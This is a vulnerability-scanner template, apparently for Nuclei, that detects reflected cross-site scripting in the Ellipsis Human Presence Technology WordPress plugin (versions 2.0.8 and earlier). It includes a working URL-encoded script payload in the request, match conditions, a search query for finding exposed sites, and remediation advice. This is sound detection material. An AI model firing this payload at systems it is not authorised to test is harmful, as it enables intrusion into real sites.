id: wp-ellipsis-xss

info:
  name: Ellipsis Human Presence Technology <= 2.0.8 - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: |
    该模板用于检测 Ellipsis Human Presence Technology <= 2.0.8 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%2...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpscan.com/vulnerability/c0a138d8-93ac-463c-b650-d849352c0b44
    - https://packetstormsecurity.com/files/154393/
    - https://wordpress.org/plugins/ellipsis-human-presence-technology/
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/ellipsis-human-presence-technology/"
  tags: wpscan,packetstorm,wordpress,wp-plugin,ellipsis-human-presence-technology,xss,vuln

http:
  - raw:
      - |
        GET /wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.location)</script>'
          - '<form id="protected-forms-table"'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"
